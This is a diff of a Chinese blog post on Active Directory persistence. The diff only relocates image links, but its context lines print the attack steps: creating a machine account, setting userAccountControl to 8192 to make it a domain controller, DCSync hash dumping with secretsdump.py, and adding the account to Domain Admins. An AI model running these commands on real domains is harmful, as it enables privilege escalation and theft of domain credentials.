@@ -18,11 +18,11 @@ layout: post
 
 在活动目录中，`userAccountControl` 是每一个账户的必备属性，该属性是一个位字段，不同的标志位代表不同的用户信息，该属性的值为所有标志位值的和。
 
-![](https://s2.loli.net/2022/03/17/Iqr2HX74ncJyEPi.png)
+![](/assets/posts/2022-01-17-domain-persistence-machine-accounts/Iqr2HX74ncJyEPi.png)
 
 下图是微软官方文档中给出的可能标志位，以及其十六进制和十进制值，详情请参考：[Use the UserAccountControl flags to manipulate user account properties](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)。
 
-![](https://s2.loli.net/2022/03/17/tSh4HkTerp6K9Vf.png)
+![](/assets/posts/2022-01-17-domain-persistence-machine-accounts/tSh4HkTerp6K9Vf.png)
 
 `userAccountControl` 中有一个名为 `SERVER_TRUST_ACCOUNT` 的标志位，其十六进制值为 0x2000，十进制值为 8192，用来表示该账户是域控制器的机器帐户。当机器账户的 `userAccountControl` 属性设置了 `SERVER_TRUST_ACCOUNT` 位后，Active Directory 必须将该账户的 `primaryGroupId` 属性设置为域控制器组的 RID。因此，只需更改 `userAccountControl` 即可为普通域成员机器授予域控制器的特权。
 
@@ -38,7 +38,7 @@ $Password = ConvertTo-SecureString 'Passw0rd' -AsPlainText -Force
 New-MachineAccount -MachineAccount "PENTEST" -Password $($Password) -Domain "pentest.com" -DomainController "DC01.pentest.com" -Verbose
 ```
 
-![](https://s2.loli.net/2022/03/17/e2EmxrdYOHJTSR1.png)
+![](/assets/posts/2022-01-17-domain-persistence-machine-accounts/e2EmxrdYOHJTSR1.png)
 
 （2）执行以下命令，通过 [PowerView.ps1](https://github.com/shigophilo/tools/blob/master/PowerView.ps1) 查询新添加的机器账户 `PENTEST$`。可以看到，账户 `PENTEST$` 的主要组 ID（`primaryGroupId`）为 515，这是 Domian Computers 组的 RID，说明 `PENTEST$` 此时还是一台普通域成员机器，如下图所示。
 
@@ -47,7 +47,7 @@ Import-Module .\PowerView.ps1
 Get-NetComputer -Identity "PENTEST" -Properties name, primaryGroupID, userAccountControl
 ```
 
-![](https://s2.loli.net/2022/03/17/EydCaD1jGWRZM8J.png)
+![](/assets/posts/2022-01-17-domain-persistence-machine-accounts/EydCaD1jGWRZM8J.png)
 
 （3）执行以下命令，通过 PowerView.ps1 将 `PENTEST$` 账户的 `userAccountControl` 属性值设为 8192，这将更改账户的主要组 ID 为 516，如图下所示。此时，`PENTEST$` 账户的主要组被改为了 Domain Controllers，也就是域控制器组。
 
@@ -56,11 +56,11 @@ Import-Module .\PowerView.ps1
 Set-DomainObject -Identity "PENTEST$" -Set @{"userAccountControl" = 8192} -Verbose
 ```
 
-![](https://s2.loli.net/2022/03/17/QidlvPF4Kcxn5MR.png)
+![](/assets/posts/2022-01-17-domain-persistence-machine-accounts/QidlvPF4Kcxn5MR.png)
 
 如下图所示，此时 `PENTEST$` 账户已经是一台域控制器了。
 
-![](https://s2.loli.net/2022/03/17/ih6fPeKzpEZvJkY.png)
+![](/assets/posts/2022-01-17-domain-persistence-machine-accounts/ih6fPeKzpEZvJkY.png)
 
 （4）由于其拥有所需的特权并且账户密码已知，所以可直接通过 secretsdump.py 执行 DCSync 操作来导出域用户哈希，如图所示。
 
@@ -68,7 +68,7 @@ Set-DomainObject -Identity "PENTEST$" -Set @{"userAccountControl" = 8192} -Verbo
 python3 secretsdump.py pentest.com/PENTEST\$:Passw0rd@172.26.10.11 -just-dc
 ```
 
-![](https://s2.loli.net/2022/03/17/4YvjwnardLbGKER.png)
+![](/assets/posts/2022-01-17-domain-persistence-machine-accounts/4YvjwnardLbGKER.png)
 
 根据上述利用过程，我编写了一个简单的 PowerShell 脚本 NewDomainController.ps1，以下是完整的代码。
 
@@ -244,7 +244,7 @@ Import-Module .\NewDomainController.ps1
 NewDomainController -MachineAccount "PENTEST" -Password "Passw0rd" -Domain "pentest.com" -DomainController "DC01.pentest.com"
 ```
 
-![](https://s2.loli.net/2022/03/17/48CHbZp2fNnky7x.png)
+![](/assets/posts/2022-01-17-domain-persistence-machine-accounts/48CHbZp2fNnky7x.png)
 
 ## 加入特权组
 
@@ -254,15 +254,15 @@ NewDomainController -MachineAccount "PENTEST" -Password "Passw0rd" -Domain "pent
 net group "Domain Admins" PENTEST$ /add /domain
 ```
 
-![](https://s2.loli.net/2022/03/17/VwaWkEnNjg2OrUM.png)
+![](/assets/posts/2022-01-17-domain-persistence-machine-accounts/VwaWkEnNjg2OrUM.png)
 
 如图下所示，获得域管理员权限的机器账户可成功导出域内用户哈希。
 
-![](https://s2.loli.net/2022/03/17/k2BFWmxAZnX76d5.png)
+![](/assets/posts/2022-01-17-domain-persistence-machine-accounts/k2BFWmxAZnX76d5.png)
 
 值得注意的是，如果机器账户位于像 Domain Admins 这样的特权组，那么机器账户是被允许登录的，如下图所示：
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220507122049517.png)
+![](/assets/posts/2022-01-17-domain-persistence-machine-accounts/image-20220507122049517.png)
 
 ## Ending......
 
